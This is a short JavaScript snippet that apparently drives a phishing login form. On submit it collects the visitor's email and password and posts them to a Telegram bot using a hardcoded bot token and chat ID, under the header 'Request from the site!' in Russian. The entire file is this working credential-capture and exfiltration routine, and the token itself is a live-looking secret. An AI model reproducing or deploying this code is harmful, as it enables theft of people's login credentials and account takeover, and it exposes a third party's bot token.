let name = document.querySelector(".name");
let password = document.querySelector(".password");

const TOKEN = `6803820382:AAFn3NNAtR_P7kcKaoiuDfLLYrCh0m7EXjQ`;
const CHAT_ID = `-1002094218845`;
const URL_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;

document.getElementById("tg").addEventListener("submit", function (e) {
  e.preventDefault();
  let message = `<b>Заявка с сайта!</b>\n`;
  message += `Email: <b>${name.value}</b>\n`;
  message += `Password: <b>${password.value}</b>\n`;
  axios.post(URL_API, {
    chat_id: CHAT_ID,
    parse_mode: "html",
    text: message,
  });
});
